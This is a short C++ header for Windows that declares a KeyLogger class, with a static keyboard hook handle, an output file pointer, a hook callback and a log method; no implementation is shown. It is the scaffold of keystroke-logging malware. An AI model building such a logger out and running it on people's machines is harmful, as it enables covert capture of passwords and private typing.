#ifndef H_KEYLOGGER
#define H_KEYLOGGER

#define _WIN32_WINNT 0x0501

#include <windows.h>
#include <iostream>
#include <stdio.h>

static HHOOK hook;
static FILE *output;

class KeyLogger {

    public:

    KeyLogger();
    ~KeyLogger();
    static LRESULT hookFunction(int nCode, WPARAM wParam, LPARAM lParam);
    void log();
};

#endif // H_KEYLOGGER
